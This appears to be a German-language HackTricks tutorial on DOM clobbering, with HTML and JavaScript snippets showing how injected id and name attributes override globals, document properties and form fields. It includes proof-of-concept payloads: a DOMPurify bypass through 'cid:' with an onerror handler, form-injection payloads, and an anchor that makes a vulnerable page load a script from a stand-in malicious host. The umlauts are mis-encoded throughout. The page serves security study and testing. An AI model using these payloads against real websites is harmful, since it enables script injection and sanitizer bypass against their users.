# Dom Clobbering

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com).
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

## **Grundlagen**

Es ist m√∂glich, **globale Variablen im JS-Kontext** mit den Attributen **`id`** und **`name`** in HTML-Tags zu generieren.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Nur** bestimmte Elemente k√∂nnen das **name-Attribut** verwenden, um globale Variablen zu √ºberschreiben. Diese sind: `embed`, `form`, `iframe`, `image`, `img` und `object`.

Interessanterweise erh√§lt man, wenn man ein **Formularelement** verwendet, um eine Variable zu √ºberschreiben, den **`toString`**-Wert des Elements selbst: `[object HTMLFormElement]`, aber mit dem **Anker** ist der **`toString`** der Anker-**href**. Daher kann man, wenn man das **`a`**-Tag verwendet, die **Wert** kontrollieren, wenn es als **Zeichenkette** behandelt wird:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays & Attribute

Es ist auch m√∂glich, ein Array und Objektattribute zu **√ºberschreiben**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Um **ein drittes Attribut** (z. B. x.y.z) zu √ºberschreiben, m√ºssen Sie ein **`form`** verwenden:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Das √úberschreiben weiterer Attribute ist **komplizierter, aber immer noch m√∂glich**, indem man iframes verwendet:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Der style-Tag wird verwendet, um dem iframe gen√ºgend Zeit zum Rendern zu geben. Ohne ihn erhalten Sie eine Warnung f√ºr "undefined".
{% endhint %}

Um tiefere Attribute zu √ºberschreiben, k√∂nnen Sie **iframes mit HTML-Codierung** verwenden, wie folgt:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Filterumgehung**

Wenn ein Filter die **Eigenschaften** eines Knotens mit etwas wie `document.getElementByID('x').attributes` **durchl√§uft**, k√∂nnten Sie das Attribut **`.attributes`** **√ºberschreiben** und den Filter **au√üer Kraft setzen**. Andere DOM-Eigenschaften wie **`tagName`**, **`nodeName`** oder **`parentNode`** und mehr sind ebenfalls **√ºberschreibbar**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **√úberschreiben von `window.someObject`**

In JavaScript ist es √ºblich, Folgendes zu finden:
```javascript
var someObject = window.someObject || {};
```
Die Manipulation von HTML auf der Seite erm√∂glicht das √úberschreiben von `someObject` mit einem DOM-Knoten und kann potenziell Sicherheitsl√ºcken verursachen. Zum Beispiel k√∂nnen Sie `someObject` durch ein Anker-Element ersetzen, das auf ein b√∂sartiges Skript verweist:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
In einem anf√§lligen Code wie:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Diese Methode nutzt die Skriptquelle aus, um unerw√ºnschten Code auszuf√ºhren.

**Trick**: **`DOMPurify`** erm√∂glicht die Verwendung des Protokolls **`cid:`**, das **Anf√ºhrungszeichen nicht URL-codiert**. Dies bedeutet, dass Sie ein codiertes Anf√ºhrungszeichen injizieren k√∂nnen, das zur Laufzeit decodiert wird. Daher f√ºhrt das Injizieren von etwas wie **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** dazu, dass das HTML-codierte `&quot;` zur Laufzeit **decodiert** wird und aus dem Attributwert **entkommt**, um das Ereignis **`onerror`** zu **erzeugen**.

Eine andere Technik verwendet ein **`form`**-Element. Bestimmte clientseitige Bibliotheken √ºberpr√ºfen die Attribute eines neu erstellten Formulars, um sie zu bereinigen. Durch Hinzuf√ºgen eines `input` mit `id=attributes` innerhalb des Formulars √ºberschreiben Sie effektiv das Attribut `attributes` und verhindern, dass der Sanitizer auf die tats√§chlichen Attribute zugreift.

Sie k√∂nnen [**ein Beispiel f√ºr diese Art von Clobbering in diesem CTF-Writeup finden**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## √úberschreiben des Dokumentobjekts

Gem√§√ü der Dokumentation ist es m√∂glich, Attribute des Dokumentobjekts mit DOM Clobbering zu √ºberschreiben:

> Das [Document](https://html.spec.whatwg.org/multipage/dom.html#document)-Interface [unterst√ºtzt benannte Eigenschaften](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Die [unterst√ºtzten Eigenschaftsnamen](https://webidl.spec.whatwg.org/#dfn-supported-property-names) eines [Document](https://html.spec.whatwg.org/multipage/dom.html#document)-Objekts bestehen zu jedem Zeitpunkt aus den folgenden, in [Baumreihenfolge](https://dom.spec.whatwg.org/#concept-tree-order) entsprechend dem Element, das sie beigetragen hat, wobei sp√§tere Duplikate ignoriert werden und Werte von [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)-Attributen vor Werten von name-Attributen stehen, wenn dasselbe Element sowohl das eine als auch das andere beitr√§gt:
>
> \- Der Wert des name-Inhaltsattributs f√ºr alle [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)-, [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)-, [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)-, [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)- und [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)-Elemente, die ein nicht leeres name-Inhaltsattribut haben und sich [in einem Dokumentbaum](https://dom.spec.whatwg.org/#in-a-document-tree) mit dem Dokument als [Wurzel](https://dom.spec.whatwg.org/#concept-tree-root) befinden;\
> \
> \- Der Wert des [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)-Inhaltsattributs f√ºr alle [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)-Elemente, die ein nicht leeres [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)-Inhaltsattribut haben und sich [in einem Dokumentbaum](https://dom.spec.whatwg.org/#in-a-document-tree) mit dem Dokument als [Wurzel](https://dom.spec.whatwg.org/#concept-tree-root) befinden;\
> \
> \- Der Wert des [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)-Inhaltsattributs f√ºr alle [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)-Elemente, die sowohl ein nicht leeres [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)-Inhaltsattribut als auch ein nicht leeres name-Inhaltsattribut haben und sich [in einem Dokumentbaum](https://dom.spec.whatwg.org/#in-a-document-tree) mit dem Dokument als [Wurzel](https://dom.spec.whatwg.org/#concept-tree-root) befinden.

Mit dieser Technik k√∂nnen Sie h√§ufig verwendete **Werte wie `document.cookie`, `document.body`, `document.children`** und sogar Methoden in der Document-Schnittstelle wie `document.querySelector` √ºberschreiben.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Schreiben nach dem √ºberschriebenen Element

Die Ergebnisse von Aufrufen von **`document.getElementById()`** und **`document.querySelector()`** k√∂nnen durch das Einf√ºgen eines `<html>`- oder `<body>`-Tags mit einem identischen id-Attribut ver√§ndert werden. So kann es gemacht werden:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Dar√ºber hinaus kann durch die Verwendung von Stilen, um diese injizierten HTML-/Body-Tags zu verbergen, eine Beeintr√§chtigung durch anderen Text im `innerText` verhindert werden, wodurch die Effektivit√§t des Angriffs erh√∂ht wird:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Untersuchungen zu SVG haben ergeben, dass ein `<body>`-Tag ebenfalls effektiv genutzt werden kann:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Um das HTML-Tag in SVG in Browsern wie Chrome und Firefox zu verwenden, ist ein `<foreignobject>`-Tag erforderlich:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering von Formularen

Es ist m√∂glich, **neue Eintr√§ge in einem Formular hinzuzuf√ºgen**, indem man einfach das `form`-Attribut in einigen Tags angibt. Dies kann verwendet werden, um **neue Werte in einem Formular hinzuzuf√ºgen** und sogar einen neuen **Button** zum **Absenden** hinzuzuf√ºgen (Clickjacking oder Missbrauch von `.click()` JS-Code):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Weitere Formattribute finden Sie [**hier**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Referenzen

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript f√ºr Hacker: Lernen Sie, wie ein Hacker zu denken.

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks als PDF herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
